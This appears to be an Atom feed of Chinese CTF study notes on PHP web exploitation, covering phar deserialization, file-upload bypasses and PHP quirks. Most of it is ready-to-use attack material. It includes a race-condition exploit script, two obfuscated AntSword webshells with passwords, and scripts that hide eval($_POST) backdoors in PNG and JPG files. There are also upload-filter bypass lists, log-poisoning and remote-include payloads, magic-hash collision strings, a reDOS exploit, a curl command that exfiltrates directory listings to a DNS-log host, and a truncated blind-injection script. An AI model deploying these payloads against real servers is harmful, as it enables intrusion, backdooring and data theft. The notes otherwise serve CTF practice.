href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h4><p><img src="https://s2.loli.net/2023/04/18/uJm29U1KoICiXl3.png" alt="phar反序列化前置知识"><br><img src="https://s2.loli.net/2023/04/18/ujNiJdK79YUWPyS.png" alt="phar文件结构"><br><img src="https://s2.loli.net/2023/04/18/RDSGLEqZCg3szPv.png" alt="漏洞原理"><br><img src="https://s2.loli.net/2023/04/18/ZsUD1jKMyVeimF4.png" alt="漏洞利用条件"><br>注:<br>（1）phar文件只看文件内容，不看后缀名<br>（2）使用时利用伪协议phar://文件名读取该文件</p><h4 id="其它反序列化链"><a href="#其它反序列化链" class="headerlink" title="其它反序列化链"></a>其它反序列化链</h4><p>找到该框架的版本以及其所用的序列化链<br>从网上找到POC直接利用就行</p><h4 id="使用条件竞争执行phar反序列化"><a href="#使用条件竞争执行phar反序列化" class="headerlink" title="使用条件竞争执行phar反序列化"></a>使用条件竞争执行phar反序列化</h4><pre><code>import requestsimport threadingimport base64url = &#39;&#39;f = open(&#39;./phar.phar&#39;, &#39;rb&#39;)data = f.read()flag = Falsedef work1():    requests.post(url=url+&quot;?fn=a&quot;, data=data)def work2():    global flag    r = requests.post(url=url+&quot;?fn=phar://phar.phar/&quot;, data=&quot;&quot;)    if &quot;flag&#123;&quot; in r.text and flag is False:        print(base64.b64encode(r.text.encode()))        flag = Truewhile flag is False:    a = threading.Thread(target=work1)    b = threading.Thread(target=work2)    a.start()    b.start()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;基础概念&quot;&gt;&lt;a href=&quot;#基础概念&quot; class=&quot;headerlink&quot; title=&quot;基础概念&quot;&gt;&lt;/a&gt;基础概念&lt;/h4&gt;&lt;p&gt;在各类语言中，将对象的状态信息转换为可存储或可传输的过程就是序列化&lt;br&gt;序列化的逆过程就是便是反序列化，主要是为了方便对象</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="https://liu1272.github.io/2023/04/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://liu1272.github.io/2023/04/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2023-04-14T03:24:00.000Z</published>
    <updated>2023-07-07T07:49:23.095Z</updated>
    
    <content type="html"><![CDATA[<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>文件上传存在的漏洞一般有：</p><pre><code>类型限制绕过：Web应用程序对上传文件的类型进行限制，黑名单或白名单方式              攻击者可通过在请求包中伪造Content-Type字段或使用特定的文件扩展名的方式绕过限制，上传恶意文件。文件名欺骗：攻击者通过修改上传文件的文件名，绕过文件类型检测，从而上传恶意文件。目录遍历：攻击者通过在上传文件的路径中使用../等符号，绕过应用程序的安全限制，成功上传文件到其他目录。权限提升：攻击者上传恶意文件，通过漏洞提升权限，获取更高的系统权限。二进制文件上传：攻击者上传二进制文件到服务器，通过漏洞执行恶意代码。</code></pre><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>操作木马文件提权 获取网站权限</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>burp抓包勤快点，多上传马，慢慢测试过滤规则，多积累木马。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>【绕过前端检测】</p><ol><li>禁用JS</li><li>更改前端文件</li><li>更改文件后缀</li></ol><p>【后端校验文件类型】<br>将Content-Type内容修改成image/png</p><p>【后端检测文件后缀 · 黑名单】</p><pre><code>上传.user.ini        // auto_prepend_file = 1.jpg或者.htaccess        // AddType application/x-httpd-php .jpg上传木马并更改为合法后缀和文件类型</code></pre><p>【文件内容过滤】</p><pre><code>先使用二分法确定过滤了什么东西1. 后缀名不完整 .php5 .phtml等绕过2. 在数据包中文件后缀名前加空格3. 使用phP绕过对php的检测4. 上传.htacess文件5. 末尾加上::$DATA6. 双写pphphp绕过7. 末尾加空格绕过8. 0x00截断上传9. 末尾加.绕过10. %00截断上传11. 后缀名前加.12. MINE绕过&lt;? echo &#39;123&#39;;?&gt;                               //short_open_tags=on&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;    //无限制&lt;% echo &#39;123&#39;;%&gt;                               //asp_tags=on php_version &lt; 7&lt;script language=”php”&gt;echo &#39;123&#39;; &lt;/script&gt;   //php_vsesion &lt; 7可以用&#123;&#125;代替[]过滤了()，那就用反引号&#39;对log过滤了使用lo&quot;.&quot;g绕过</code></pre><p>【未循环验证】<br>可以使用x.php..类似的方法</p><p>【UA注入日志包含】</p><pre><code>上传完.user.ini        // auto_append_file=&quot;1.png&quot;再上传图片             // &lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;访问网站然后修改ua头信息</code></pre><p>【文件头检测】</p><pre><code>增加对应的文件头GIF文件:  GIF89APNG文件:  89 50 4E 47 0D 0A 1A 0A</code></pre><p>【远程包含文件】</p><pre><code>使用  https://www.bejson.com/convert/ip2int/  将IP转换为纯数字&lt;?=include&#39;http://IP转换/&#39;&gt;</code></pre><p>【条件竞争】<br>session包含，前文已经详细写过，不再重复描述。</p><p>【图片二次渲染】<br>将木马插入到图片中，类似于图片马<br>脚本放在文末</p><p>【getimagesize 绕过】<br>getimagesize() 获取上传文件信息，图片马绕过</p><p>【exif_imagetype 绕过】<br>getimagesize() 获取上传文件信息，图片马绕过</p><p>【文件大小检测】<br>拒绝传入太小或太大的文件，控制文件大小，建议使用图片马</p><p>【Apache陌生后缀解析漏洞】<br>Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。<br>Apache认为应该从右到左开始判断解析方法的。<br>如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止。</p><h4 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h4><ol><li>后端验证：采用服务端验证模式</li><li>后缀验证：基于白名单，黑名单过滤</li><li>MIME验证：基于上传自带类型艰检测</li><li>内容检测：文件头，完整性检测</li><li>自带函数过滤</li><li>WAF防护软件：宝塔、云盾等</li></ol><p>蚁剑生成的shell脚本</p><pre><code>      // 连接密码: 123&lt;?php $qdjZ=create_function(chr(0x1cf-0x1ab).str_rot13(&#39;f&#39;).chr(0x15009/0x307).chr(228-119).str_rot13(&#39;r&#39;),base64_decode(&#39;ZQ==&#39;).chr(104076/882).str_rot13(&#39;n&#39;).chr(651-543).chr(01545-01475).base64_decode(&#39;JA==&#39;).chr(90045/783).chr(0xca0e/0x1d2).str_rot13(&#39;z&#39;).chr(810-709).str_rot13(&#39;)&#39;).chr(29028/492));$qdjZ(base64_decode(&#39;Njc5M&#39;.&#39;jMzO0&#39;.&#39;BldkF&#39;.&#39;sKCRf&#39;.&#39;&#39;.base64_decode(&#39;VQ==&#39;).base64_decode(&#39;RQ==&#39;).str_rot13(&#39;9&#39;).chr(0xbe50/0x244).chr(390-304).&#39;&#39;.&#39;&#39;.str_rot13(&#39;S&#39;).chr(0157503/0761).str_rot13(&#39;k&#39;).base64_decode(&#39;TQ==&#39;).chr(01077-0725).&#39;&#39;.&#39;NdKTs&#39;.&#39;yMDM3&#39;.&#39;Njk5O&#39;.&#39;w==&#39;.&#39;&#39;));?&gt;      // 连接密码: TyKPuntU&lt;?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode(&#39;bw==&#39;).base64_decode(&#39;bQ==&#39;).base64_decode(&#39;ZQ==&#39;),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(&#39;YQ==&#39;).base64_decode(&#39;bA==&#39;).chr(060340/01154).chr(01041-0775).base64_decode(&#39;cw==&#39;).str_rot13(&#39;b&#39;).chr(01504-01327).base64_decode(&#39;ZQ==&#39;).chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode(&#39;NjgxO&#39;.&#39;Tc7QG&#39;.&#39;V2QWw&#39;.&#39;oJF9Q&#39;.&#39;&#39;.str_rot13(&#39;G&#39;).str_rot13(&#39;1&#39;).str_rot13(&#39;A&#39;).base64_decode(&#39;VQ==&#39;).str_rot13(&#39;J&#39;).&#39;&#39;.&#39;&#39;.chr(0x304-0x2d3).base64_decode(&#39;Ug==&#39;).chr(13197/249).str_rot13(&#39;F&#39;).base64_decode(&#39;MQ==&#39;).&#39;&#39;.&#39;B1bnR&#39;.&#39;VXSk7&#39;.&#39;MjA0N&#39;.&#39;TkxOw&#39;.&#39;==&#39;.&#39;&#39;));?&gt;</code></pre><p>PNG二次渲染脚本</p><pre><code>&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#39;1.png&#39;);  //要修改的图片的路径/*木马内容   &lt;?$_GET[0]($_POST[1]);?&gt;   */?&gt;建议使用已经渲染过一次的文件写入木马，防止文件改动过大。</code></pre><p>JPG二次渲染脚本</p><pre><code>&lt;?php    $miniPayload = &quot;&lt;?=eval(\$_POST[1]);?&gt;&quot;;    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;        die(&#39;php-gd is not installed&#39;);    &#125;    if(!isset($argv[1])) &#123;        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);    &#125;    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) &#123;        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) &#123;            die(&#39;Incorrect SOI marker&#39;);        &#125;        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) &#123;                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) &#123;                    while((!$dis-&gt;eof())) &#123;                        if($dis-&gt;readByte() === 0xFF) &#123;                            if($dis-&gt;readByte !== 0x00) &#123;                                break;                            &#125;                        &#125;                    &#125;                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                &#125; elseif($correctImage) &#123;                    $outStream = $outStreamTmp;                &#125; else &#123;                    break;                &#125;                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;                    die(&#39;Success!&#39;);                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;    unlink(&#39;payload_&#39;.$argv[1]);    die(&#39;Something\&#39;s wrong&#39;);    function checkImage($filename, $data, $unlink = FALSE) &#123;        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    &#125;    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) &#123;            if(isset($m[1])) &#123;                $extraBytes = (int)$m[1];            &#125;        &#125;    &#125;    class DataInputStream &#123;        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) &#123;            $this-&gt;binData = &#39;&#39;;            $this-&gt;order = $order;            if(!$fromString) &#123;                if(!file_exists($filename) || !is_file($filename))                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);                $this-&gt;binData = file_get_contents($filename);            &#125; else &#123;                $this-&gt;binData = $filename;            &#125;            $this-&gt;size = strlen($this-&gt;binData);        &#125;        public function seek() &#123;            return ($this-&gt;size - strlen($this-&gt;binData));        &#125;        public function skip($skip) &#123;            $this-&gt;binData = substr($this-&gt;binData, $skip);        &#125;        public function readByte() &#123;            if($this-&gt;eof()) &#123;                die(&#39;End Of File&#39;);            &#125;            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        &#125;        public function readShort() &#123;            if(strlen($this-&gt;binData) &lt; 2) &#123;                die(&#39;End Of File&#39;);            &#125;            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) &#123;                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            &#125; else &#123;                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            &#125;            return $short;        &#125;        public function eof() &#123;            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        &#125;    &#125;?&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;分类&quot;&gt;&lt;a href=&quot;#分类&quot; class=&quot;headerlink&quot; title=&quot;分类&quot;&gt;&lt;/a&gt;分类&lt;/h4&gt;&lt;p&gt;文件上传存在的漏洞一般有：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;类型限制绕过：Web应用程序对上传文件的类型进行限制，黑名单或白名单方式
    </summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>PHP特性</title>
    <link href="https://liu1272.github.io/2023/04/12/PHP%E7%89%B9%E6%80%A7/"/>
    <id>https://liu1272.github.io/2023/04/12/PHP%E7%89%B9%E6%80%A7/</id>
    <published>2023-04-12T02:12:00.000Z</published>
    <updated>2023-04-17T17:03:30.235Z</updated>
    
    <content type="html"><![CDATA[<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>积累各种函数，PHP语法特性，从中发现漏洞<br>要求深入了解PHP语言并熟练使用其函数。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>【PHP比较运算符一览表】$a == $b      等于       true，如果类型转换后 $a 等于 $b。$a === $b     全等       true，如果 $a 等于 $b，并且它们的类型也相同。$a != $b      不等       true，如果类型转换后 $a 不等于 $b。$a &lt;&gt; $b      不等       true，如果类型转换后 $a 不等于 $b。$a !== $b     不全等     true，如果 $a 不等于 $b，或者它们的类型不同。$a &lt; $b       小与       true，如果 $a 严格小于 $b。$a &gt; $b       大于       true，如果 $a 严格大于 $b。$a &lt;= $b      小于等于   true，如果 $a 小于或者等于 $b。$a &gt;= $b      大于等于   true，如果 $a 大于或者等于 $b。$a &lt;=&gt; $b     太空船运算符（组合比较符）   当$a小于、等于、大于 $b时 分别返回一个小于、等于、大于0的 int 值。当两个操作对象都是数字字符串，或一个是数字另一个是数字字符串，就会自动按照数值进行比较。当比较时用的是 === 或 !==， 则不会进行类型转换(因为不仅要对比数值，还要对比类型)【preg_match 函数】preg_match()返回 pattern的匹配次数。 因为preg_match()在第一次匹配后将会停止搜索，所以它的值将是0次（不匹配）或1次因为preg_match函数无法处理数组，所以可以通过数组的方式绕过^表示匹配行头，$表示匹配行尾，i表示大小写都匹配，m表示多行匹配当^$一起的时候表示精准匹配，需要行首行尾都要有【intval 函数】通过使用指定的进制 base 转换（默认是十进制），返回变量的整数数值base是0时检测变量格式，有0x前缀使用十六进制，0开头使用八进制，否则使用十进制且只看字母之前的部分intval()不能用于object否则会产生E_NOTICE错误并返回1（也就是True）由于数组为一个对象，所以对这时它会返回1此外，如果字符串以空格开头，intval函数会将其删除，然后再进行转换【弱类型绕过】===是先比较他们的类型然后在比较，==是先把他们转化成相同类型然后在进行比较例如，将一个字符串转换为整数时，PHP会尝试将字符串中的数字部分转换为整数如果字符串中不包含数字，则转换结果为0【strpos 函数】strpos($num, &quot;0&quot;)返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE（区分大小写）【stripos 函数】查找字符串在另一字符串中第一次出现的位置（不区分大小写）注意！字符串位置从0开始，不是从1开始【md5】对象的md5值是由对象的属性和方法组成的字符串的md5散列值。如果两个对象的属性和方法完全相同，则它们的md5值也会相同。因此a[]=1&amp;b[]=2的md5值就是相同的还有0e开头的字符串，会被PHP解释为0弱比较时常用的有QNKCDZO   s878926199a240610708  aabg7XSs  aabC9RqS  s878926199a强比较的需要使用数组绕过当使用string强行转换成字符串时限制了数组绕过这方法强碰撞使用M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2和M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2【in_array 函数】在大海（文件）中捞针（$allow）$allow = array(1,&#39;2&#39;,&#39;3&#39;);var_dump(in_array(&#39;文件&#39;,$allow));返回的为true$allow = array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;);var_dump(in_array(&#39;文件&#39;,$allow));返回false其实还有第三个参数type，用于判断数据类型是否相同php字符串和int比较时字符串会被转换成int因为是弱类型转换，所以数字后面的字符串会被忽略【file_put_contents 函数】file_put_contents(file,data,mode,context)file：规定写入的文件data：写入文件的数据mode：如何打开/写入文件(FILE_USE_INCLUDE_PATH,FILE_APPEND,LOCK_EX)context:文件句柄的环境【array_push 函数】给数组的结尾添加其他数值【PHP反射类】PHP反射类ReflectionClass()是PHP5及以上的一个内置类，它允许开发者在运行时获取一个类的信息:1.获取类的名称、父类、接口和命名空间2.获取类的属性，并获取或修改属性的访问权限、默认值和注释3.获取类的方法，并获取或修改方法的访问权限、参数、返回值和注释4.判断类是否为抽象类、接口或终极类5.获取类的文档注释和注解信息6.动态创建类的实例，并调用类的方法和属性使用echo new ReflectionClass命令即可输出因为ReflectionClass变量已经定义了，所以PHP解释器不会输出警告信息，而是将该变量的值设置为null。最终的效果是输出ReflectionClass类的定义信息，而没有输出警告信息。【call_user_func 函数】call_user_func($func, 1, 2);使用1,2的参数调用func的方法并返回结果【0x识别】7.1以下版本，0x的字符串也是可以识别为十六进制的在高版本下进制转换可以使用hex2bin函数将十六进制转换为ASCII字符例如:&lt;?=`cat *`;经过base64编码变成PD89YGNhdCAqYDs=使用bin2hex函数转换成5044383959474e6864434171594473带e的话会被认为是科学计数法，可以绕过is_numeric检测写入时使用伪协议php://filter/write=convert.base64-decode/resource=1.php注意:等号在base64中只是起到填充的作用，有没有等号解码出来的内容是相同的。【SHA1】sha1弱等于的，找加密后0e开头的即可aaK1STfY ==&gt;0e76658526655756207688271159624026011393aaO8zKZF ==&gt;0e89257456677279068558073954252716165668甚至可以使用数组绕过！【$$覆盖赋值】$var = &#39;hello&#39;;$$var = &#39;world&#39;;echo $hello;      // 输出 world可以看成这样子$var = &#39;hello&#39;;$($var) = &#39;world&#39;;echo $hello;      // 输出 world【ereg】只存在与PHP 5.3.4及之前的版本中一个比较古老的正则表达式匹配函数，一大把的漏洞用指定的模式搜索一个字符串中指定的字符串,成功为true,否则为false（大小写敏感）ereg函数存在NULL（%00）截断漏洞，可以绕过正则过滤，使用%00截断。函数匹配的字符串中包含NULL字符时会在NULL处停止匹配【strrev 函数】翻转字符串，没啥好讲的。【PHP异常处理类】Exception处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类关于内置类的应用前面已经讲过了echo new ReflectionClass(system(&#39;ls&#39;));这种题看似很难，其实只需要在PHP手册里找到合适的类即可【GLOBALS】$GLOBALS — 引用全局作用域中可用的全部变量一个包含了全部变量的全局组合数组，变量的名字就是数组的键。【is_file 函数】检查指定的文件名是否是正常的文件?file=php://filter/resource=1.phpphp://filter/resource=1.phpphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.phpphp://filter/read=convert.quoted-printable-encode/resource=1.phpcompress.zlib://1.php使用伪协议就能绕过检测原因是，伪协议实际上是一种特殊的URI（统一资源标识符），可以用来访问本地或远程的资源。当使用伪协议访问文件时，PHP会将其视为一个URI而不是一个文件路径，因此is_file函数无法判断其是否是一个文件。【filter 函数】对来自非安全来源的数据（比如用户输入）进行验证和过滤实际上感觉没啥用？？？【目录溢出】参数长度超过了配置文件中的&quot;max_input_vars&quot;和&quot;post_max_size&quot;参数时发生溢出发生溢出后可以操作文件读取，文件删除，文件上传，代码执行，拒绝服务例如:?file=/proc/self/root/....../proc/self/root/var/www/html/a.php【trim 函数】trim(string,charlist)string       必需。规定要检查的字符串。charlist     可选。规定从字符串中删除哪些字符。省略该参数则移除下列所有字符：&quot;\0&quot;       - NULL&quot;\t&quot;       - 制表符&quot;\n&quot;       - 换行&quot;\x0B&quot;     - 垂直制表符&quot;\r&quot;       - 回车&quot; &quot;        - 空格绕过时可以用 数字 + - . %09 %0a %0b %0c %0d %20【PHP变量名】PHP变量名由数字字母下划线组成GET或POST的方式传进去的变量名，会自动将空格 + . [ 转换为_而且还有一个特性就是被转化一次之后，就不会再次转换【extract 函数】extract($a)数组a中的键名作为变量名，键值作为变量值，导入到当前的符号表中。如果数组a中存在与当前符号表中已有的变量名相同的键名，则会覆盖已有的变量值。【gettext 函数】在开启该拓展后_()等效于gettext()等效于echo【get_defined_vars 函数】返回一个包含所有已定义变量列表的多维数组，包括环境变量、服务器变量和用户定义的变量【readfile 函数利用】函数作用:读取文件并写入到输出缓冲利用方法:将读取的参数设置为想要读取的文件路径(适当增加../)【正则最大回溯次数绕过/正则溢出攻击】PHP为了防止正则表达式的拒绝服务攻击（reDOS）给 pcre 设定了一个回溯次数上限(pcre.backtrack_limit)回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false注:攻击脚本EXP在文末【小小的语法糖】在PHP中，&#39;或者shell_exec()都是执行shell命令的方法。&#39;是一种语法糖，可以将命令作为字符串嵌入到PHP代码中，相当于执行了shell_exec()方法。但是&#39;只能执行简单的shell命令而且不能获取命令的输出结果。// 使用``语法糖执行shell命令$time = `date`;echo $time;// 使用shell_exec()方法执行shell命令$time = shell_exec(&#39;date&#39;);echo $time;【使用curl获取信息】首先需要一个域名(可以去这里搞一个http://dnslog.cn/或者https://requestbin.net/)再执行命令 ————&gt; curl`ls`.域名【parse_str 函数】把查询字符解析到变量$query_string = &#39;foo[]=123&amp;foo[]=456&#39;;parse_str($query_string, $vars);echo $vars[&#39;foo&#39;][0];  // 输出：123echo $vars[&#39;foo&#39;][1];  // 输出：456【ectract 函数】从数组中将变量导入当前的符号表$person = array(&#39;name&#39; =&gt; &#39;Alice&#39;, &#39;age&#39; =&gt; 25, &#39;gender&#39; =&gt; &#39;female&#39;);extract($person);echo $name;    // 输出：Aliceecho $age;     // 输出：25echo $gender;  // 输出：female【tee 命令】tee用于显示程序的输出并将其复制到一个文件中ls / |tee 1     意思是列出根目录并保存到1文件下【修改源文件的骚方法】sed是一种流编辑器处理下一行，这样不断重复，直到文件末尾但是文件内容并没有改变，除非你使用重定向存储输出xargs是给命令传递参数的一个过滤器可以将管道或标准输入（stdin）数据转换成命令行参数，也能够从文件的输出中读取数据。当使用系统命令时system(&#39;ls | xargs sed -i &quot;s/exec/system/&quot;&#39;);exec(&#39;ls | xargs sed -i &quot;s/exec/system/&quot;&#39;);【调用类内函数方法】无参调用类的静态方法:classname=classname::member_function无参调用类的数组传递调用:传入的参[0]=classname&amp;传入的参[1]=member_function【Linux命令盲注】if [ `ls / -1|awk &#39;NR==1&#39;|cut -c &#123;&#125; ` = b ];then sleep 2;fi    ls / -1 :列出根目录下的所有文件和目录，每个文件和目录占一行    #awk &#39;NR==&#123;0&#125;&#39; :逐行输出获取    #cut -c &#123;1&#125; :截取单个字符    `` :执行命令并返回结果    sleep 2 :延迟两秒回显    fi :Shell脚本中表示if语句结束Shell命令盲注脚本在文末。【PHP命令数字混合计算】php里数字可以和命令可以进行运算eval(1-phpinfo()-1)的结果为执行phpinfophpinfo()执行成功返回true，1-1-1=-1此时仍然可以使用无字母数字RCE脚本，具体查看文末【create_function 函数】create_function(&#39;$a,$b&#39;,&#39;return 111;&#125;phpinfo();//&#39;)    相当于function a($a, $b)&#123;    return 111;&#125;phpinfo();//&#125;所以  ?show=&#125;?&gt;&lt;?=`ls`;//  就可以执行ls命令【命名空间污染】在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径（使用的是根命名空间）如果你在其他namespace里调用系统类，就必须写绝对路径这种写法因为将函数名改为了以反斜杠（\）开头的命名空间，所以正则表达式无法匹配到这个函数名安全的正则表达式应该是   &#39;/^\\myapp\\[a-z0-9_]*$/isD&#39;【包含session文件】SESSION 文件保存的目录由 session.save_path 指定，文件名以 sess_ 为前缀，后跟 SESSION ID默认路径一般为:/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID文件中的数据是序列化之后的 SESSION 数据getshell方法:添加一个Cookie：PHPSESSID=flag并在PHP_SESSION_UPLOAD_PROGRESS下添加一句话木马详细操作请查看上一篇文章。</code></pre><p>各种payload</p><pre><code>小数点(含有0)      ?num=4476.0科学计数           ?num=4476e0十六进制           ?num=0x117c八进制             ?num=010574八进制+空格        ?num= 010574正负号             ?num=+4476.0</code></pre><p>下面记一道$$覆盖赋值的题:</p><pre><code>&lt;?phphighlight_file(__FILE__);include(&#39;flag.php&#39;);error_reporting(0);$error=&#39;你还想要flag嘛？&#39;;$suces=&#39;既然你想要那给你吧！&#39;;foreach($_GET as $key =&gt; $value)&#123;        //自己传入的x是key,flag是value    if($key===&#39;error&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;                       //$(x)=$(flag)，现在相当于x变量就是flag&#125;foreach($_POST as $key =&gt; $value)&#123;       //自己传入的error是key,x是value    if($value===&#39;flag&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;                       //$(error)=$(x)=$(flag)，相当于把error变量重构&#125;if(!($_POST[&#39;flag&#39;]==$flag))&#123;    die($error);                         //error输出时其实已经是flag了&#125;echo &quot;your are good&quot;.$flag.&quot;\n&quot;;die($suces);?&gt;解法:(GET)?x=flag   (POST)error=x</code></pre><p>再来一题</p><pre><code>&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 = &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 = $_GET[&#39;v1&#39;];    $v2 = $_GET[&#39;v2&#39;];    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;        if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;        if(preg_match(&#39;/ctfshow/&#39;, $v1))&#123;            getFlag($v1,$v2);    &#125;&#125;?&gt;解法:?v1=ctfshow&amp;v2=GLOBALS</code></pre><p>reDOS攻击EXP</p><pre><code>#原理就是提交含有重复的会被正则匹配的巨大的字符串，使它匹配到不能再匹配为止import requestsurl=&quot;??????????&quot;data=&#123;    &#39;?&#39;:&#39;???&#39;*250000+&#39;?????&#39;&#125;r=requests.post(url,data=data)print(r.text)</code></pre><p>bash盲注EXP</p><pre><code>//一些语句自己改正#!/usr/bin/env python3#-*- coding:utf-8 -*-import requestsimport time as tfrom urllib.parse import quote as urlenurl  = &#39;??????/??=&#39;????&#39;;&#39;alphabet = [&#39;&#123;&#39;,&#39;&#125;&#39;, &#39;.&#39;, &#39;@&#39;, 